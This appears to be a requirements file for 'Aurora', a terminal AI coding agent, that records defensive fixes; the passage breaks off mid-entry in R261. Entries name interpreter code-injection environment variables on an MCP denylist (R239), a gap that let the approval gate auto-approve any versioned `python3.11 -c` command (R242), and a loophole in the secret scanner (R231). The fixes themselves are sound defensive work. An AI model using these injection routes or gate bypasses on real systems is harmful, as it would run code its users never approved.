# Aurora — Requirements

Testable behavioral rules, one per numbered entry, in the same `R<n>` numbering
already used throughout the codebase's comments and commit messages. This
file didn't exist before R223 — earlier requirements live only as code
comments and commit history; new ones from here on get an entry too.

**Before adding one, take the next number from `documents/CHANGELOG_TECHNICAL.md`
— the canonical spec — and from `git log`, never from this file and never
from a code grep.** Both of the obvious shortcuts are wrong, and both were
tried here on 2026-08-26 and produced collisions:

- *This file* documented only R223 while R220–R228 were already allocated.
- *A code grep* misses any requirement whose fix left no `R<n>` string in the
  source. R224 (Ollama remote-API status) and R225 (mdrender trailing
  newline) are real, committed requirements with no marker in any `.py`.

`git log --format=%s | grep -oE 'R[0-9]+' | sort -t R -k2 -n | tail -1` is
the reliable high-water mark, because every requirement lands in a commit
whose subject names it. R227 and R228 below were back-filled from their
code comments after such a collision.

1. **R223 — Ollama as a configured provider.** A `config.yaml` provider
   entry with `type: ollama` talks to a local/LAN Ollama server correctly:
   - Reachability (`_probe`, used by `pick_endpoint` before every turn and
     by the UI's status render) checks Ollama's own root route, never
     llama.cpp's `/props` (which Ollama doesn't implement and would always
     404).
   - `live_context_limit(model)` reports the real trained context window
     for the named model via Ollama's `/api/show`, for any installed model
     — not gated on the `model == "local"` sentinel llama.cpp's `/props`
     path requires.
   - `live_model_name()` returns `None` for an Ollama provider rather than
     attempting `/props` — left unimplemented pending a real "which
     resident model" concept (`GET /api/ps`), since Ollama can hold several
     models loaded at once.
   - No API key is required or sent when the provider config has none.
   - Chat turns (streaming text, tool calls) need no Ollama-specific
     branch in `turn()` — Ollama's OpenAI-compatible endpoint is handled by
     the existing generic OpenAI streaming/delta parsing.
   - A provider with no `type:` (or any value other than `"ollama"`)
     continues to use llama.cpp's `/props` exactly as before this change —
     no regression for existing llama.cpp/OpenRouter configs.

   **Verified live (2026-08-26)** against a real Ollama server on m7, not
   just mocked HTTP: probe, `live_context_limit` (against two different
   model families, `qwen35` and `gemma`, correctly reading the
   family-prefixed context-length key each time), a full streamed chat
   turn, and a real multi-round tool-call → tool-result → final-answer
   round trip, all through the actual `Engine`/`config.yaml` path, not just
   `OpenAICompatProvider` in isolation.

   **Caveat found during live verification, not a code defect:** Ollama's
   own `/api/show` can report `"capabilities": ["tools", ...]` for a model
   that then never actually emits a structured tool call at inference time
   — `qwen2.5-coder:3b` printed the call as plain JSON text 3/3 tries
   despite being marked tools-capable; `qwen3:1.7b` emitted correct
   structured `tool_calls` 3/3 tries on the identical prompts. Aurora has
   no way to detect this ahead of time (Ollama's own capability flag says
   the opposite), so it isn't fixable in code — recorded here so a future
   session doesn't waste time debugging "why does an Ollama model configured
   with `tools: true` never call any tools" as if it were an Aurora bug.
   Prefer the Qwen3 family for an Ollama backend Aurora will actually use
   tools with.

2. **R227 — a colliding extension tool name resolves first-wins on BOTH
   sides.** `extensions.load()` builds the name→runner map with
   `setdefault`, not `.update()`. `.update()` let the last-loaded extension
   win the runner while `tools.set_extensions()` (which dedupes the spec
   list) keeps the FIRST spec for that name — so a collision paired one
   extension's advertised description and parameters with another's actual
   code. The approval gate and the model's own call decision both key off
   the spec a name is shown with, so running different code under it breaks
   that invariant with no sign beyond a generic "duplicate skipped" warning.

3. **R228 — `key_status` never reports a false "not set".** With an
   encrypted key store present and a cached passphrase that fails to
   decrypt it (stale after an external re-encryption, or another session
   sharing AURORA_HOME), `keystore.key_status` must return the same
   `"possibly set (encrypted file — enter passphrase to confirm)"` answer
   the no-cached-passphrase case gets. It used to swallow the decrypt
   failure and fall through to a flat `"not set"` — indistinguishable from
   no store existing at all, and confidently wrong with the file right
   there.

4. **R229 — `compact.clip_transcript` stays inside its own budget.** The
   returned string must never exceed `max_tokens * CHARS_PER_TOKEN`
   characters. The elision marker counts against that budget, not on top of
   it: it used to be spliced in after head and tail had already consumed the
   whole limit, so a function whose only job is making an over-sized request
   fit returned ~90 characters more than asked, every time — most of the
   budget when the caller is nearly out of window, which is exactly when it
   is called. When the budget cannot hold head, tail and marker together,
   the bound wins and the text is hard-truncated without a marker. Also:
   `flatten_history`'s `tool` branch must render a null `content` as empty
   (R222's rule); it alone still used the raw `.get` and printed `None`.

5. **R230 — `/commit`'s staging step fails as a message, not a traceback.**
   `gitcommit.stage_all` is the only mutating call in the `/commit` flow.
   It ran with `check=True` and its call site caught nothing, so an ordinary
   git failure — a stale `index.lock` left by a crashed git, an unreadable
   path, a timeout on a large tree — raised `CalledProcessError` out of the
   slash command. It must instead raise `gitcommit.GitError` carrying git's
   own stderr, and `/commit` must catch that and abort with a printed
   reason rather than drafting a message and committing an index that was
   never staged. `GitError` was declared in the module but raised nowhere;
   this is what it is for.

6. **R231 — the timestamp exemption must verify a date.** The entropy
   fallback in `secrets.scan` skips tokens that look like dated filenames
   (`20260710_211200_…`). That guard must constrain the field ranges —
   century, month `01`–`12`, day `01`–`31` — not merely ask whether the
   token starts with eight digits. The loose form exempted any
   numerically-prefixed token (`99999999aB3xY7q…`, month 99, day 99) from
   the entropy pass entirely, which is a false NEGATIVE in a secret
   detector: the value is sent to the provider with no challenge at all,
   whereas a false positive only costs a prompt. Real dated filenames must
   keep being exempted.

7. **R232 — the session record must reach the file inside the flock.**
    `Session.log` writes through a buffered text stream, so `f.write()` only
    fills a userspace buffer — the `write()` syscall happens at flush. The
    flush must therefore happen inside the `flock`ed region, before
    `LOCK_UN`. Releasing first meant R170f's lock serialized nothing that
    actually touched the file: for a record larger than the 8KB buffer — a
    tool result, which is most of a session log's bytes — the writer flushed
    whole chunks under the lock and left the remainder to flush after it, so
    a second process resumed onto the same session id could append between
    those chunks and produce a physically interleaved, unparseable line.
    That is the exact corruption the lock was added to prevent.

8. **R233 — the Happy Eyeballs fast path connects the address it selected.**
    When a host resolves to a single address, `happy_eyeballs_connect` must
    connect that exact `getaddrinfo` sockaddr with the family already
    chosen, via the same `_connect_one` helper each racing attempt uses. It
    previously called `socket.create_connection(sa[:2], …)`, which (a)
    truncated an IPv6 sockaddr `(addr, port, flowinfo, scope_id)` to its
    first two elements, discarding the scope id — `sa[0]` carries no
    `%iface` suffix, so the kernel rejects the result with EINVAL and a
    link-local IPv6 host was unreachable whenever it resolved to exactly one
    address, though the racing path reached it fine — and (b) re-resolved
    the hostname a second time, ignoring the family already selected. The
    two paths share one helper so they cannot diverge again.

9. **R234 — every atomic write fsyncs its parent directory.** Both
   `paths.write_text_atomic` and `paths.write_bytes_atomic` must fsync the
   parent directory fd *after* `os.replace`, not just the temp file's
   contents before it. Fsyncing only the file makes the new inode's data
   durable while leaving the rename that publishes it as an unflushed
   directory-metadata write — a power loss in that window discards the
   rename and the OLD file survives. R171 established this for
   `write_text_atomic`; `write_bytes_atomic` was left without it, and it is
   the writer the encrypted key store uses, i.e. the single file whose loss
   cannot be recovered from anywhere else. The shared step lives in
   `paths._fsync_dir` so the two writers cannot drift apart again.

10. **R235 — a truncated clipboard copy must say so.** `clipboard.copy`
   returns a human description of the method used, and the caller shows it
   as the confirmation. OSC52 caps its payload at `OSC52_MAX_B64` base64
   bytes (~75KB of text) and, being fire-and-forget, cannot report the drop
   itself — so `copy` must detect the overflow up front and return a
   description that names it, never a bare `"OSC52 (terminal)"`. Silent
   truncation is reachable in normal use: over SSH, OSC52 is the FIRST
   choice, and a `/copy-all` session export routinely exceeds the cap, so
   the user was handed a cut-off paste with a success message. The base64
   cut itself stays 4-byte aligned so what does arrive decodes cleanly.

11. **R236 — `patch.parse` ends a hunk body only at a real file header.**
   A hunk body line is content, whatever it starts with. Ending the body at
   any line starting with `---`/`+++` misreads the removal of a `---` line
   (rendered `----`) or the addition of a `++` line (rendered `+++`) as a
   new file section, truncating the hunk and discarding the rest of it. That
   broke the module's central all-or-nothing guarantee two ways, both
   reporting success: a deletion-only hunk collapsed to pure context and
   applied nothing, and a mixed hunk applied its earlier edits while
   silently dropping everything after the `---`. `---`/`+++` lines are
   markdown horizontal rules and YAML front-matter delimiters, so this is
   reachable on ordinary documents. A file header is recognised as the PAIR
   `--- <path>` followed by `+++ <path>` (marker then a space), or a
   `diff ...` section line — never a bare prefix match. Multi-file
   `diff -u` output keeps parsing into separate hunks, and `git diff`
   output with `diff --git`/`index` lines now parses too, which the prefix
   check rejected outright.

12. **R237 — the bootstrap prompt is fetched with a cap and persisted
    atomically.** `bootstrap.fetch_url` must stream with a byte cap
    (`_FETCH_CAP`), not `c.get(url).text`, which reads an arbitrarily large
    body fully into memory before any caller can inspect it —
    `web_extension.web_fetch` already streams around exactly this, and the
    content here is used far more dangerously: it is sent verbatim as the
    first TOOL-ENABLED turn, and the URL is re-fetched at startup, so an
    oversized or hijacked body recurs every session. `bootstrap.save` and
    `refresh_from_source` must write through `paths.write_text_atomic`
    (R146a), for both the prompt and its `.source` sidecar; a plain
    `write_text` truncates on a crash mid-write and the next session then
    runs a truncated prompt with tools enabled.

13. **R238 — an extension tool spec with no runner is skipped, loudly.**
    `tools.set_extensions` must drop any spec whose name has no entry in
    `runners`, with a warning, exactly as it already drops a nameless one.
    Keeping it advertises a tool to the model that `run_tool` answers with
    `[error: unknown tool '<name>']` on every call — "advertised and
    permanently uncallable", the precise failure the nameless-spec guard was
    added for, reached through a different door and with no warning at all.
    The model can burn its whole iteration budget retrying. This is ordinary
    in a hand-written extension (a tool renamed in `SPEC` but not in
    `RUNNERS`, a typo in a `RUNNERS` key), and `discover()` merges static and
    `register()`-supplied tools before this runs, so requiring the pair rules
    out no legitimate arrangement. Only the unpaired spec is dropped — one
    typo must not disable an extension's other tools. Relatedly,
    `extensions.scaffold` writes through `write_text_atomic`: R207's comment
    named the truncation risk but fixed only the encoding half.

14. **R239 — every interpreter code-injection variable is stripped from an
    MCP child's environment.** `mcp._ENV_DENYLIST` exists because a server's
    `env:` block is hand-edited YAML and these names are not identity or
    secrets but *code execution* in the child. The list must therefore cover
    both the path and the option variable of each interpreter family:
    `PYTHONPATH`/`PYTHONHOME`/`PYTHONEXECUTABLE`, `PERL5LIB`/`PERL5OPT`/
    `PERLLIB`, `RUBYOPT`/`RUBYLIB`, `CLASSPATH`/`JAVA_TOOL_OPTIONS`/
    `_JAVA_OPTIONS`/`JDK_JAVA_OPTIONS`, alongside the loader and shell
    entries already present. It previously listed Perl's path variable and
    Ruby's option variable but only one of each pair, and for Python only
    `PYTHONSTARTUP` — which Python reads in INTERACTIVE mode only, so it has
    no effect on a spawned server, while `PYTHONPATH`, which prepends to
    `sys.path` and runs a shadowing module at import time before the
    server's first line, was absent. A stdio MCP server is very often a
    Python process; this repo's own `agentic_context_mcp` entry runs one.
    Stripping stays unconditional (never allowlist-filtered), so a typo
    cannot reintroduce one, and an ordinary configured variable such as
    `GITHUB_TOKEN` must still reach the child.

15. **R240 — the per-file snapshot cap bounds the READ, not just the store.**
    `rewind.snapshot_before_write` must reject an oversized target from its
    `stat()` size, before calling `read_bytes()`. The check ran on
    `len(data)` *after* the read, which caps what gets written into the
    marker while doing nothing about the allocation — the exact spike
    `MAX_SNAPSHOT_BYTES` was introduced to prevent, given this function sits
    directly on the approval path and its target is whatever file the model
    chose to edit. Measured before the fix: a 63MB file peaked at 63MB of
    allocation and was then discarded by a 21MB cap; after, 0. A second
    `len(data)` check stays, for a file that grows between the stat and the
    read. The marker itself is written through `_atomic_write_bytes` rather
    than `write_text` — the same truncate-first hazard that function was
    added for in R193: a crash mid-write leaves a half-written marker while
    the mutation it records proceeds anyway, so `/undo` silently has nothing
    to offer for a write that did happen.

16. **R241 — the model's file mutations are written atomically.**
    `tools.write_file`, `tools.edit_file` and `tools.apply_patch` must go
    through `paths.write_text_preserving`, never `Path.write_text`.
    `write_text` truncates the file and then writes, so a crash, ENOSPC, or
    a kill in that window leaves the user's source file truncated or empty.
    Aurora already treats this as unacceptable in the *reverse* direction —
    `rewind._atomic_write_bytes` (R193) exists precisely so an undo cannot
    leave a file empty — while the forward path, which is what actually
    edits a user's tree, had no such protection.
    `write_text_preserving` additionally must:
    - **preserve the existing mode.** `os.replace` adopts the temp file's
      mode and `mkstemp` creates `0600`, so a naive atomic write turns an
      executable script into a private, non-executable file.
    - **follow symlinks.** `os.replace` on a symlink swaps the LINK for a
      regular file, orphaning the file the user meant to edit;
      `Path.write_text` wrote through it.
    - leave a **new** file at the umask's permissions, not `mkstemp`'s
      `0600`.

17. **R242 — a versioned interpreter name is the same command.**
    `approve._is_dangerous` tests each token's basename against
    `DANGEROUS_COMMANDS` by exact match, so it must also test the name with
    a trailing version suffix stripped (`python3.11`→`python`, `pip3`→`pip`,
    `perl5.36`→`perl`, `node20`→`node`). Without it, `python3` was
    recognised and `python3.11` — the standard binary name on most Linux
    distributions and Homebrew — was not, which reopened R149's bug on the
    entry R149 itself calls worst ("interpreters: the ARGS are the program,
    so no prefix of them is safe"): approving a harmless
    `python3.11 -c "print(1)"` stored the two-token rule `python3.11 -c`
    and thereafter auto-approved `python3.11 -c "<anything>"` with no
    prompt, permanently. Verified end to end before and after. The exact
    command the user approved must still auto-approve, and ordinary
    commands (`gcc-13`, `sha256sum`, `base64`) must not be swept in — the
    strip only matters when the stripped stem is itself in
    `DANGEROUS_COMMANDS`, and over-triggering costs only a re-prompt.

18. **R243 — the ungated lint fallback writes nothing.** `lint_check` is not
    in `tools.NEEDS_APPROVAL` and is not an `mcp_*` name, so
    `tools.needs_approval` returns False and it runs with no approval
    prompt. Its no-ruff fallback must therefore do a genuinely read-only
    syntax check — the built-in `compile()` on the file's source, in
    process. It previously shelled out to `python -m py_compile`, which
    writes `__pycache__/<name>.cpython-XY.pyc` beside the source as a side
    effect: a tool the user never approved created files in their tree,
    dirtying a clean repo and failing outright against a read-only
    directory. The in-process form also removes an interpreter spawn per
    call, and must still report a real syntax error with its line number.

19. **R244 — MCP server `command`/`args` expand `~` and `$VARS`.**
    `config.yaml` is tracked in git and shared across machines with
    different home layouts (e.g. macOS `~/Desktop/GitTea/...` vs Linux
    `~/repositories/...`), but `MCPManager` passed `command`/`args`
    straight to `Popen`, which does no shell-style expansion — a literal
    absolute path in the config only ever worked on the machine it was
    written on, and broke silently (logged error, not a crash) the moment
    the file was pulled onto the other machine. `command` and each entry
    in `args` must now be run through `os.path.expanduser` and
    `os.path.expandvars` before spawning, so config.yaml can use `~` and
    env vars and stay valid on both machines.

20. **R245 — a long `run_command`/a busy turn must not block asking "is it
    done yet?".** Two related gaps, both from the same root cause: exactly
    one thing runs at a time in Aurora (the model's own tool call blocks
    the whole turn; the TUI's `_worker` is the sole consumer of its one
    inbox, so a `!` command typed while it's busy just queues behind it).
    - `run_command` takes `background: bool` — when true it launches the
      command detached (same process-group ownership as the foreground
      path) and returns a job id immediately instead of blocking until
      exit. `check_command(job_id)` (no approval needed, read-only) polls
      a background job's status and recent output, `tail`-bounded; with no
      `job_id` it lists every known job. Capped at `MAX_BACKGROUND_JOBS`
      concurrent jobs; any still running at process exit are killed
      (atexit), not left orphaned. This lets the MODEL answer "is it
      downloading?" as an ordinary new turn instead of that question
      having to wait behind the download's own blocking tool call.
    - The TUI gained a second queue + worker (`_side_inbox`/`_side_worker`)
      that only `!` bash commands submitted while the main worker is busy
      route to — they run CONCURRENTLY with whatever the main worker is
      doing, instead of queuing behind it. `cd`/`clear` are refused there
      (not silently, not by racing `self._bash_cwd`/the scrollback against
      the main worker) since the two threads share that state with no
      lock between them; anything read-only (`tail`, `ps`, checking a
      download's progress) runs normally. This lets the HUMAN check on
      something themselves without waiting on the model's own turn.

21. **R246 — a background job (R245) must be cancellable.** Backgrounding
    deliberately disconnects a job from Esc-Esc's `fe.cancel_event` (that
    event belongs to the current turn, and a background job is meant to
    outlive its turn), which meant a job that was started could not be
    stopped short of it finishing on its own or the whole Aurora process
    exiting (the R245 atexit cleanup). `cancel_command(job_id)` (asks
    approval, same as run_command) sends the same process-group SIGKILL the
    foreground path uses. Calling it on an already-finished job reports
    that instead of erroring; calling it on an unknown job_id is an
    `[error: ...]`, same shape check_command already uses.

22. **R247 — Aurora can use plain-Markdown "doc skills" (Claude Code/Hermes-shaped
    SKILL.md), not just its own executable ones.** `/name` already ran an
    executable or `.py` skill (R11); it now also resolves against any
    `SKILL.md` (frontmatter `name:`/`description:` + prose) found under the
    directories the user names in config.yaml's `doc_skill_roots:` list — a
    plain YAML list, as many paths as wanted, no default. Unlike an
    executable skill there is nothing to subprocess: the body is fed to the
    model as a real, tool-enabled turn via `_run_turn` — the exact mechanism
    `/bootstrap` already uses to turn a saved file into a prompt, not a new
    one. `/skills` lists both kinds together, doc skills marked `[doc]`; an
    executable skill wins a name collision, same shadowing rule `discover()`
    already applies between its own two search dirs.

    **No path is ever assumed.** `doc_skill_roots:` absent or empty means no
    doc skills — Aurora is not tied to any one machine's layout, so nothing
    in `aurora/skills.py` names a path. This machine's own two libraries
    (`~/claude_code/.agentic_context/SKILLS`, `~/.hermes/skills/local`) are
    data in this repo's own `config.yaml`, alongside the other machine-
    specific values already there (`base_url`, the `mcp_servers` path) — not
    a constant in the source.

    **Two real bugs found and fixed while building this, both proven against
    the actual skill corpus, not hypothetical:**
    - `Path.rglob` does not follow a symlinked category directory (this
      machine's own `SKILLS/{analysis,meta,writing}` all are, pointing into
      a separate skills repo). `recurse_symlinks` only exists on 3.11's
      `rglob` from Python 3.13, and this project supports 3.11+, so it
      can't be relied on portably either way. Measured: `rglob` found 1 of
      6 real `SKILL.md` files under this repo's own SKILLS root, the other 5
      silently absent, no error. Fixed with `os.walk(..., followlinks=True)`,
      which also degrades on an unreadable directory for free (`onerror`
      defaults to ignoring `OSError`, unlike `rglob` which raises).
    - A `description:` whose prose contains its own bare `word: word` is
      invalid strict YAML (an unquoted colon+space ends a plain scalar) and
      is common in the real corpus, not a one-off typo — confirmed on
      `agentic-context-bootstrap`'s actual live file
      ("...a topic: SOUL.md's machine brief...")
      , which came back with **no** description under a strict-only parser.
      `_parse_frontmatter` now falls back to a lenient line-by-line
      `key: value` extractor (splitting only the first colon) when strict
      YAML fails, recovering exactly the two fields this module reads
      (`name`, `description`) without attempting to be a real YAML parser.

    **Test:** `tests/test_skills.py` — discovery from an unconfigured/empty/
    nonexistent root returns nothing (never a guessed path); a nested
    `SKILL.md` found recursively; earlier-root shadowing; survival of an
    unreadable root; frontmatter stripped from the body, including the
    embedded-colon regression case above; unknown name returns `None`;
    `/skills` listing shows both kinds with `[doc]` marking the prose ones;
    an executable skill shadows a doc skill of the same name. Full suite
    (1273 tests) re-run clean after the change.

23. **R253 — a read-only command, a question, or a model switch typed while
    a turn is running must not wait for it.** R245 removed this wait for
    `!` bash commands only; `/commands` and prompts still queued behind
    `_worker`, the sole consumer of the TUI's one inbox. Reported with a
    screenshot: 182s into a `run_command`, both `/model` and "are you
    there?" answered `(queued — still running previous command)`.
    - **Nothing may gain a second writer on `engine.messages`/the session.**
      That single-writer property is why neither has a lock
      (`ARCHITECTURE.md` §6), and it holds unchanged after this.
    - While busy, a submitted line routes by what it would touch: a
      read-only `/command` (`ui.SIDE_SAFE_COMMANDS` — mutates no engine
      state, never prompts, never touches `_bash_cwd`; plus `/<any>
      help|man`) and `/model` run on the side channel; a plain prompt runs
      as a quick-ask; everything else still queues but must name the
      command and the reason, and point at Esc-Esc. Idle, submission order
      through `_inbox` is unchanged.
    - **A prompt typed mid-turn is answered by `Engine.quick_ask`**: one
      provider call, no tools, on a snapshot of history, appending nothing.
      It can answer, it cannot act, and the exchange is not remembered next
      turn — that is the stated price of not locking. **It must not borrow
      the running turn's provider or frontend**: both carry per-turn mutable
      state (`on_think`, `extra_body`, `cache_prompt`; the renderer that
      closes the live think block), so a side turn gets its own provider —
      closed after use, key resolved non-interactively — and streams
      straight into the chat pane. Its spend accrues to
      `/cost` like any other; `_used` (the context gauge) must not move; it
      logs as `side_ask`/`side_answer`, never `user`/`assistant`, so no
      reader counts a side exchange as a turn. The chat labels it before
      the answer streams.
    - **`/model` picked mid-turn defers its switch** to when the turn ends
      (`_pending_model`, applied in `_worker`'s `finally`) — `Engine.send`
      has already bound its provider/model, so switching during the turn
      would change the model under a request in flight. Picked after the
      turn already ended, it switches immediately rather than deferring
      into a switch that never lands.
    - **The input line is single-slotted and now locked.** `ask()`/
      `select_menu()` hold `_prompt_lock` (reentrant — `/model` on a keyless
      provider prompts twice). The main worker blocks for it; the side
      worker refuses with `InputLineBusy` and says so, rather than parking
      behind an unanswered approval gate. **The lock must be impossible to
      leak** — a leaked one is permanent (the worker blocks on its next
      prompt forever), so the claim, the setup and the restore are all under
      try/finally with the release in a nested `finally`.
    - **A running side command must be visible** — `_side_busy` had been set
      and read since R245 but never rendered.

    **Test:** `tests/test_tui.py` + `tests/test_core.py` — routing per kind
    and idle order; a guard on the SIDE_SAFE list itself; queue-with-a-reason;
    side-worker dispatch; the lock refusing one thread while blocking the
    other, and reporting the refusal; deferred vs immediate model switch; the
    status-bar indicator; and `quick_ask` history isolation, snapshot
    identity, cost-without-gauge, log event names, and the no-model case.
    Each verified to fail against a mutation of the behavior it covers —
    note `_prompt_lock` is reentrant, so every lock assertion probes from
    another thread (probing from the leaking thread passes regardless). Full
    suite (1296 tests) re-run clean.

24. **R254 — R253's side channel must not lose work, leak secrets, corrupt the
    running turn's display, or cost more than it has to.** A review pass on
    R253 found nine defects in code that had shipped with a green,
    mutation-checked suite. The rules the fixes encode:
    - **A routing decision made on one thread must be re-validated where it
      is acted on.** `_busy` is read on the UI thread and acted on later by
      the side worker, which also drains `!` commands first — so the gap is
      as long as that channel is backed up, not microseconds. A prompt whose
      turn ended in the meantime is handed back to `_inbox` as an ordinary
      turn; answering it as a side turn drops a real task out of the
      conversation for good, since a side turn is never written to history.
    - **A deferred model switch must land exactly once.** Check-and-park and
      take-and-apply run under one lock, and `_worker` claims `_busy` under
      it too, so no turn starts midway through a switch.
    - **Side-channel output must not touch the running turn's display.** It
      may not close the turn's think row (the "plain output means this
      request stopped thinking" inference belongs to the turn's own output),
      and it must not merge into a streaming entry — concurrent streams
      otherwise interleave character by character. Its own non-merging entry
      kind, appended whole; a new kind must be taught to `_entry_fragments`,
      which otherwise falls through to the think renderer.
    - **The side path is subject to every gate the main path is.** R58's
      secret scan in particular: `quick_ask` refuses (naming the kind, never
      the value) rather than challenging, because the challenge needs the
      input line the running turn owns.
    - **It must not cost more than the turn would.** The system prompt keeps
      its cache breakpoint (`cache_enabled`, not a hardcoded `False`), and
      the provider is cached and reused — a fresh one re-probes the endpoint
      and re-handshakes per question, which is the cost R95h removed.
    - **Anything running must be visible and stoppable.** The side indicator
      survives the turn it was started behind, and Esc-Esc can cancel a side
      turn — the standard R246 set for background jobs.

    **Test:** 15 tests across `tests/test_tui.py` and `tests/test_core.py`,
    each mutation-checked; R254a/b/c/d/g each existed first as a runnable
    reproduction of the wrong behaviour. Full suite (1311 tests) re-run clean.

25. **R255 — a one-off side completion must not borrow the turn's think
    channel, and must not discard an answer that arrived as reasoning.**
    Reported live: the approval gate's "Explain" produced a short thinking
    indicator, then nothing, then the same menu. The explanation had been
    generated and thrown away.
    - **Read both channels.** `result.text` when there is any; fall back to
      the reasoning when a thinking model spends its whole budget there and
      returns empty content. A model that answers properly must still have
      its content preferred over its chain-of-thought.
    - **Mute `on_think` for the duration and restore it in a `finally`.**
      `Engine.send` points it at the frontend per turn; left alone, a side
      completion streams its reasoning into the RUNNING turn's think row
      (collapsed, so invisible) and into `fe.think_buffer`, which
      `/copy-last` copies as the turn's raw response. Left swapped by an
      exception, every later round of that turn streams into a dead list.
    - **Honour `cancel`.** The approval gate passes `cb.cancelled`, so a slow
      local model can be stopped mid-explanation (R246's rule).
    - **One implementation** — `providers.base.side_completion`. Three sites
      had written this independently and all three carried both bugs:
      `agent._explain_tool_call`, `gitcommit.draft_message`, and the compact
      summarizer, whose failure was a fold with no summary in it.
    - A placeholder for the truly-empty case must say what to do next, not
      only that nothing came back.

    **Test:** 9 tests in `tests/test_core.py`, each mutation-checked;
    reproduced end-to-end through a real TUI frontend before any fix.

26. **R256 — `/copy-last` must copy the whole last turn; `/copy-response`
    copies just the reply.** Reported live: a prompt that "went back and
    forth on thinking and stuff" copied as the prompt and one reply, with
    the rest missing.
    - **The whole turn, not its last message.** `engine.last_response()`
      returns the FINAL assistant message, and a turn that used tools is a
      chain — narrate, call, narrate, call, answer, wrap up — so the
      substantive reply is usually an INTERMEDIATE message and the last is
      a short "Done.". `/copy-last` now includes every assistant message of
      the turn, in order (`Engine.last_turn_messages`).
    - **Tool CALLS are named, tool OUTPUT is not.** The narration stops
      parsing without the calls ("checking the server next" followed
      straight by a conclusion); one result can be
      `tools.TOOL_OUTPUT_LIMIT` (60KB) of machine output, which is not what
      a clipboard is for. `/copy-all` remains the whole chat.
    - **The prompt and all thinking stay in** — R124's contract is
      unchanged, and `think_buffer` already accumulates across every round
      of the turn.
    - **`/copy-response` is the narrow counterpart**: the last turn's final
      reply only, no prompt, no thinking, no markers. It skips a trailing
      tool-call-only assistant message — how a turn stopped at the approval
      gate or capped on iterations ends, and where plain `/copy` hands back
      an empty string — and it never reaches back into the previous turn to
      find text when this turn produced none.
    - **Both are named in the `copy` picker**: "copy last (full)" and
      "copy last (response)". The old "copy last" was ambiguous in the one
      way that mattered, and there was no row for "just the answer".

    **Test:** 15 tests across `tests/test_core.py` and `tests/test_tui.py`,
    each mutation-checked; reproduced against a realistic multi-round turn
    first. Full suite re-run clean.

27. **R257 — the review pass over R254–R256.** Four defects in same-day
    fixes, one of them a regression in an existing command.
    - **A fallback that is right for prose is wrong for an artifact.**
      R255's reasoning fallback applies only where the string is READ by the
      user (`explain`), never where it becomes a commit message or a history
      summary. `/commit` offers its draft with a "Yes, commit" key: an empty
      draft is refused, a plausible monologue is not. `reasoning_fallback`
      defaults to False.
    - **Work that cannot run now belongs in the main queue, in order.** A
      prompt routed to a busy side channel waits outside `_inbox` while a
      later prompt runs first. Route by "can this run immediately", not
      just "is the main worker busy".
    - **A flag must not outlive the state it describes.** `clear_screen`
      resets `_open_think`, which `begin_think` now trusts.
    - **Never offer a control that does nothing.** The side-cancel row
      appears only for work that polls `_side_cancel` — a quick-ask, not a
      `!` command.

    **Test:** 9 tests, each mutation-checked and reproduced first. Three
    existing tests corrected, two of which had pinned the wrong behaviour.

28. **R258 — backspace mid `/command` reopens autocomplete, it doesn't just
    close it.** The custom `backspace` binding calls `delete_before_cursor()`
    directly — the primitive, not the behavior. prompt_toolkit only restarts
    `complete_while_typing` completion from `insert_text`'s `on_text_insert`
    hook; any text change, including a delete, unconditionally clears
    `complete_state` and nothing restarts it. One backspace while typing a
    `/command` name silently killed the popup for the rest of that line.
    Backspace now explicitly calls `buf.start_completion()` afterward when
    `complete_while_typing` is on, matching the same "identify what the
    library's binding did beyond the primitive, and decide explicitly" rule
    already established for backspace + selection (R139).

    **Test:** `test_backspace_restarts_completion` — spies on
    `start_completion` rather than driving the real async completer, which
    needs a running event loop this headless fixture doesn't have (same
    workaround as the R98 history tests).

29. **R259 — `/sessions` lists every past session, read-only.** `/resume`
    and `/search` both end in a blocking `input("...#: ")` picker — fine
    when the goal is to jump into one, wrong when the goal is just "what
    sessions do I have and when was each one last active". `/sessions`
    prints `list_sessions()`'s rows (id, last-active time, first-task
    preview) newest first with no prompt at all, marks whichever row is the
    CURRENTLY running session `(current)` so it isn't mistaken for a
    separate past one, and takes an optional count (`/sessions 50`,
    default 20) the same way `list_sessions(limit=...)` already did.
    Read-only + no `input()` + touches no engine/session state → qualifies
    for `SIDE_SAFE_COMMANDS` (R253) unlike `/resume`/`/search`, which don't.

    **Test:** `test_sessions_command_lists_ids_and_marks_current`,
    `test_sessions_command_with_no_sessions`,
    `test_sessions_command_takes_an_optional_limit` in `test_core.py`; the
    existing `test_every_side_safe_command_is_really_side_safe` and
    `man.COMMAND_MAN`-coverage tests pick up the new entry automatically.

30. **R260 — the TUI requests mouse mode 1002, not prompt_toolkit's default
    1003.** Reported bug: over an SSH session (Mac → m7), moving or
    dragging the mouse over the Aurora terminal sometimes typed raw garbage
    into the prompt — fragments shaped like `90;13M5;77;18M...`. That's an
    SGR mouse-tracking escape sequence (`\x1b[<0;90;13M`) landing
    unconsumed and falling through to plain self-insert.
    `Application(mouse_support=True)` always asks the terminal for mode
    1003 ("any-event" tracking — a report on every pixel of mouse
    MOVEMENT, click or not), which is far chattier than Aurora's own
    drag-to-select (`_ChatControl.mouse_handler`) needs: that only reacts
    to `MOUSE_MOVE` while `MouseButton.LEFT` is already held, i.e. mode
    1002 ("button-event" tracking). 1002 reports nothing for a bare,
    button-less mouse move, cutting the event volume that was outpacing
    whatever kept the escape sequences synchronized — with no loss of the
    drag-select feature itself.
    `tui._low_chatter_output()` builds the same `Vt100_Output`
    `Application()` would have anyway (via prompt_toolkit's own
    `create_output()`), with only `enable_mouse_support`/
    `disable_mouse_support` patched to send `?1002` instead of `?1003`
    (1000/1015/1006 unchanged); it returns `None` on any non-Vt100 output
    (Windows, a piped/non-tty stdout), and the TUI passes that straight
    through as `Application(output=...)` — `None` there is `Application`'s
    own "use the default" behavior, so nothing regresses off-POSIX.

    **Test:** `test_low_chatter_output_requests_1002_not_1003`,
    `test_low_chatter_output_falls_back_to_none_off_vt100`.

31. **R261 — a bare Esc cancels an accidentally-opened "Quit Aurora?"
    menu.** Reported lockup, reproduced end-to-end against a real running
    `Application` (`create_pipe_input`): a garbled draft (from the R260
    mouse-leak bug) mashed with repeated Esc to clear it walks through
    THREE different Esc meanings in one breath — clear-the-draft (1st,
    buffer non-empty), arm the quit gesture (2nd, buffer now empty), open
    "Quit Aurora?" (3rd, still inside the 2s arm window). From there, every
    further Esc used to be a no-op — same as any other confirm/challenge
    menu (`test_menu_esc_is_noop_while_open`) — so a 4th Esc trying to
    escape the menu did nothing, and neither did typing (R211 swallows
    keys while any menu is open): indistinguishable from the whole app
    being frozen, with no visible cause unless the user notices the small
